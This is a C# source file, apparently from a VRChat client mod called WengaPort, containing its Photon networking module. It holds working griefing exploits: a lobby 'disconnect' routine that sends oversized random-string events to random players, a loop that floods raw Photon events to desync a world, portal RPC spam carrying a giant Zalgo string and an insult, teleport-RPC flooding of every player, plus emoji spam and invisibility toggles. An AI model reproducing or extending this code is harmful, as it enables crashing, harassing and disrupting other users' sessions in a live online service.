﻿using System;
using WengaPort.Extensions;
using ExitGames.Client.Photon;
using Harmony;
using Il2CppSystem;
using Photon.Pun;
using UnhollowerBaseLib;
using UnityEngine;
using VRC;
using VRC.SDKBase;
using RootMotion.FinalIK;
using RealisticEyeMovements;
using System.Linq;
using System.Collections;
using WengaPort.Api;
using System.Threading;
using WengaPort.Wrappers;
using static VRC.SDKBase.VRC_EventHandler;
using VRC.Udon;
using VRC.Udon.Common.Interfaces;

namespace WengaPort.Modules
{
    internal static class Photon
    {
		public static bool EmojiSpam = false;
		public static void EmojiRPC(int i)
		{
			try
			{
                Il2CppSystem.Int32 @int = default;
				@int.m_value = i;
                Il2CppSystem.Object @object = @int.BoxIl2CppObject();
				Networking.RPC(0, Utils.CurrentUser.gameObject, "SpawnEmojiRPC", new Il2CppSystem.Object[]
				{
					@object
				});
			}
			catch
			{
			}
		}

		public static void EmoteRPC(int i)
		{
			try
			{
				Il2CppSystem.Int32 @int = default;
				@int.m_value = i;
				Il2CppSystem.Object @object = @int.BoxIl2CppObject();
				Networking.RPC(0, Utils.CurrentUser.gameObject, "PlayEmoteRPC", new Il2CppSystem.Object[]
				{
					@object
				});
			}
			catch
			{
			}
		}
		private static void OpRaiseEvent(byte code, object customObject, ObjectPublicObByObInByObObUnique RaiseEventOptions, SendOptions sendOptions)
		{
			Il2CppSystem.Object Object = Utils.Serialization.FromManagedToIL2CPP(customObject);
			PhotonHandler.field_Internal_Static_PhotonHandler_0.prop_ObjectPublicIPhotonPeerListenerObStNuStOb1CoObBoDiUnique_0.Method_Public_Virtual_New_Boolean_Byte_Object_ObjectPublicObByObInByObObUnique_SendOptions_1(code,Object,RaiseEventOptions,sendOptions);
		}

		public static bool Desync = false;
		public static IEnumerator PhotonDesyncWorld()
		{
			for (; ; )
			{
				if (RoomManager.field_Internal_Static_ApiWorld_0 == null || !Desync)
				{
					yield break;
				}
				OpRaiseEvent(210, new int[] { new System.Random().Next(0, short.MaxValue), Networking.LocalPlayer.playerId }, new ObjectPublicObByObInByObObUnique()
				{
					field_Public_EnumPublicSealedvaOtAlMa4vUnique_0 = EnumPublicSealedvaOtAlMa4vUnique.Others,
				}, SendOptions.SendReliable);
				OpRaiseEvent(209, new int[] { new System.Random().Next(0, short.MaxValue), Networking.LocalPlayer.playerId }, new ObjectPublicObByObInByObObUnique()
				{
					field_Public_EnumPublicSealedvaOtAlMa4vUnique_0 = EnumPublicSealedvaOtAlMa4vUnique.Others,
				}, SendOptions.SendReliable);
				yield return new WaitForSeconds(0.01f);
			}
			yield break;
		}

		public static GameObject Capsule = new GameObject();
		public static bool Serialize = false;
		public static bool Invisible = false;
		public static bool LockInstance = false;
		public static bool Forcemute = false;
		public static void CustomSerialize(bool Toggle)
		{
			try
			{
				if (Toggle)
				{
					Serialize = true;
					Capsule = UnityEngine.Object.Instantiate(Utils.CurrentUser.prop_VRCAvatarManager_0.prop_GameObject_0, null, true);
					Animator component = Capsule.GetComponent<Animator>();
					if (component != null && component.isHuman)
					{
						Transform boneTransform = component.GetBoneTransform((HumanBodyBones)10);
						if (boneTransform != null)
						{
							boneTransform.localScale = Vector3.one;
						}
					}
					Capsule.name = "Serialize Capsule";
					component.enabled = false;
					Capsule.GetComponent<FullBodyBipedIK>().enabled = false;
					Capsule.GetComponent<LimbIK>().enabled = false;
					Capsule.GetComponent<VRIK>().enabled = false;
					Capsule.GetComponent<LookTargetController>().enabled = false;
					Capsule.transform.position = Utils.CurrentUser.transform.position;
					Capsule.transform.rotation = Utils.CurrentUser.transform.rotation;
				}
				else
				{
					UnityEngine.Object.Destroy(Capsule);
					Serialize = false;
				}
			}
			catch
            {}
		}

		private static string RandomString(int length)
		{
			char[] array = "abcdefghlijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789".ToArray();
			string text = "";
			Il2CppSystem.Random random = new Il2CppSystem.Random(new Il2CppSystem.Random().Next(length));
			for (int i = 0; i < length; i++)
			{
				text += array[random.Next(array.Length)].ToString();
			}
			return text;
		}

		public static string RandomNumberString(int length)
		{
			string text = "";
			for (int i = 0; i < length; i++)
			{
				text += new System.Random().Next(0, int.MaxValue).ToString("X8");
			}
			return text;
		}

		public static bool DisconnectToggle = false;
		public static bool DebugSpamToggle = false;

		private static VRC_EventHandler handler;

		public static void DisconnectLobby()
		{
			if (handler == null)
			{
				handler = Resources.FindObjectsOfTypeAll<VRC_EventHandler>()[0];
			}
            VrcEvent vrcEvent = new VrcEvent
            {
				EventType = (VrcEventType)14,
				ParameterObject = handler.gameObject,
				ParameterInt = 1,
				ParameterFloat = 0f,
				ParameterString = "<3 WengaPort <3 | " + RandomString(820) + " | <3 WengaPort <3",
				ParameterBoolOp = (VrcBooleanOp)(-1),
				ParameterBytes = new Il2CppStructArray<byte>(0L)
			};
			int Type = 0;
			Player player = PlayerManager.field_Private_Static_PlayerManager_0.field_Private_List_1_Player_0.ToArray()[new Il2CppSystem.Random().Next(0, PlayerManager.field_Private_Static_PlayerManager_0.field_Private_List_1_Player_0.Count)];
			handler.TriggerEvent(vrcEvent, (VrcBroadcastType)Type, player.gameObject, 0f);
			Player player2 = PlayerManager.field_Private_Static_PlayerManager_0.field_Private_List_1_Player_0.ToArray()[new Il2CppSystem.Random().Next(0, PlayerManager.field_Private_Static_PlayerManager_0.field_Private_List_1_Player_0.Count)];
			handler.TriggerEvent(vrcEvent, (VrcBroadcastType)Type, player2.gameObject, 0f);
		}

		public static void PortalDebugSpam()
		{
			for (int i = 0; i < 3; i++)
			{
				Networking.RPC(RPC.Destination.AllBufferOne, GameObject.Find("Camera (eye)").gameObject, "ConfigurePortal", new Il2CppSystem.Object[0]);
			}
			for (int i = 0; i < 3; i++)
			{
				Networking.RPC(RPC.Destination.AllBufferOne, GameObject.Find("Camera (eye)").gameObject, "Get Fucked Russian Debug -Wenga#0666 L̛̛̾̈́̈̋͛͊̍͛̆̑̐̉̒̈̀̋̉̇̄͐͆͛͆́́̐͆̃̉̿́̀̐͋͐̃̎̅̊̀̌̾̎̓̽͛̑̃̿̈́͐̀̉̍͐̀͋̆̑̌̑̓̆̍̏͆̔̍͗̇́͋̓̍́̾͊̅̍̃̆͌̃͑͐̀̿̈́́̕͘̕͘̕̕͘͝͠͠͞͝͞͝͝͞͞͞͞͝͞L̛̛̾̈́̈̋͛͊̍͛̆̑̐̉̒̈̀̋̉̇̄͐͆͛͆́́̐͆̃̉̿́̀̐͋͐̃̎̅̊̀̌̾̎̓̽͛̑̃̿̈́͐̀̉̍͐̀͋̆̑̌̑̓̆̍̏͆̔̍͗̇́͋̓̍́̾͊̅̍̃̆͌̃͑͐̀̿̈́́̕͘̕͘̕̕͘͝͠͠͞͝͞͝͝͞͞͞͞͝͞", new Il2CppSystem.Object[0]);
			}
		}

		public static IEnumerator Event6TPRPC()
		{
			for (; ; )
            {
				if (!Desync) yield break;
				for (int I = 0; I < 15; I++)
				{
					foreach (var Player in Utils.PlayerManager.GetAllPlayers())
					{
						SendRPC(VrcEventType.SendRPC, "SendRPC", Player.field_Internal_VRCPlayer_0.gameObject, 9, 0, "TeleportRPC", VrcBooleanOp.False, VrcBroadcastType.AlwaysUnbuffered);
					}
				}
				yield return new WaitForEndOfFrame();
			}
		}
		public static void EventSpammer(this int count, int amount, System.Action action, int? sleep = null)
		{
			for (int ii = 0; ii < count; ii++)
			{
				for (int i = 0; i < amount; i++)
					action();
				if (sleep != null)
					Thread.Sleep(sleep.Value);
				else
					Thread.Sleep(25);
			}
		}
		public static void SendRPC(VrcEventType EventType, string Name, GameObject ParamObject, int Int, float Float, string String, VrcBooleanOp Bool, VrcBroadcastType BroadcastType)
		{
			if (handler == null)
			{
				handler = Resources.FindObjectsOfTypeAll<VRC_EventHandler>()[0];
			}
			VrcEvent a = new VrcEvent
			{
				EventType = EventType,
				Name = Name,
				ParameterObject = ParamObject,
				ParameterInt = Int,
				ParameterFloat = Float,
				ParameterString = String,
				ParameterBoolOp = Bool,
			};
			foreach (var Player in Utils.PlayerManager.GetAllPlayers())
			{
				handler.TriggerEvent(a, BroadcastType, Player.gameObject, 0f);
			}
		}
	}
}
